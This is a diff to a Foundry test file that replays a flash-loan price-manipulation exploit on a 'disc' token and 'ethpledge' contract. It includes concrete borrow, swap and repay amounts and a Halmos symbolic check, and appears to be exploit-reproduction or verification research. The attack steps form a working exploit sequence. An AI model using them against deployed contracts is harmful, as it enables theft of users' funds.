@@ -232,54 +232,29 @@ contract DiscoverTestBase is Test, BlockLoader {
         ethpledge.pledgein(amount);
     }
 
-    // function test_gt() public {
-    //     vm.startPrank(attacker);
-    //     emit log_named_uint("amt0", 24000e18);
-    //     borrow_disc_owner(24000e18);
-    //     printBalance("After step0 ");
-    //     emit log_named_uint("amt1", disc.balanceOf(attacker));
-    //     emit log_named_uint(
-    //         "amt2",
-    //         pair.getAmountOut(disc.balanceOf(attacker), address(disc))
-    //     );
-    //     swap_pair_attacker_disc_usdt(
-    //         disc.balanceOf(attacker),
-    //         pair.getAmountOut(disc.balanceOf(attacker), address(disc))
-    //     );
-    //     printBalance("After step1 ");
-    //     emit log_named_uint("amt3", 5000e18);
-    //     emit log_named_uint("amt4", 1);
-    //     swap_ethpledge_attacker_usdt_disc(5000e18, 1);
-    //     printBalance("After step2 ");
-    //     emit log_named_uint("amt5", (24000e18 * 1003) / 1000);
-    //     payback_disc_owner((24000e18 * 1003) / 1000);
-    //     printBalance("After step3 ");
-    //     require(attackGoal(), "Attack failed!");
-    //     vm.stopPrank();
-    // }
-
     function test_gt() public {
-        uint256 amt0 = 0x728bc400d8a064000;
-        uint256 amt1 = 0x727de34a24f900000;
-        uint256 amt2 = 0xb827516bda8b88000;
-        uint256 amt3 = 0xb748ccf2b1bbb0000;
-        uint256 amt4 = 0x72d5e5e0cd4d10000;
-        uint256 amt5 = 0x72e3bfa7259aa0000;
-
         vm.startPrank(attacker);
-        vm.assume(amt5 >= amt0);
-        borrow_disc_owner(amt0);
+        emit log_named_uint("amt0", 24000e18);
+        borrow_disc_owner(24000e18);
         printBalance("After step0 ");
-        swap_pair_attacker_disc_usdt(amt1, amt2);
+        emit log_named_uint("amt1", disc.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(disc.balanceOf(attacker), address(disc))
+        );
+        swap_pair_attacker_disc_usdt(
+            disc.balanceOf(attacker),
+            pair.getAmountOut(disc.balanceOf(attacker), address(disc))
+        );
         printBalance("After step1 ");
-        emit log_named_decimal_uint("amt3", amt3, 18);
-        emit log_named_decimal_uint("amt4", amt4, 18);
-        swap_ethpledge_attacker_usdt_disc(amt3, amt4);
+        emit log_named_uint("amt3", 5000e18);
+        emit log_named_uint("amt4", 1);
+        swap_ethpledge_attacker_usdt_disc(5000e18, 1);
         printBalance("After step2 ");
-        emit log_named_decimal_uint("amt5", amt5, 18);
-        payback_disc_owner(amt5);
+        emit log_named_uint("amt5", (24000e18 * 1003) / 1000);
+        payback_disc_owner((24000e18 * 1003) / 1000);
         printBalance("After step3 ");
-        require(!attackGoal(), "Attack succeed!");
+        require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
@@ -297,7 +272,25 @@ contract DiscoverTestBase is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt1, amt2);
         swap_ethpledge_attacker_usdt_disc(amt3, amt4);
         payback_disc_owner(amt5);
-        require(!attackGoal(), "Attack succeed!");
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_disc_owner(amt0);
+        swap_pair_attacker_disc_usdt(amt1, amt2);
+        swap_ethpledge_attacker_usdt_disc(amt3, amt4);
+        payback_disc_owner(amt5);
+        assert(!attackGoal());
         vm.stopPrank();
     }
 }
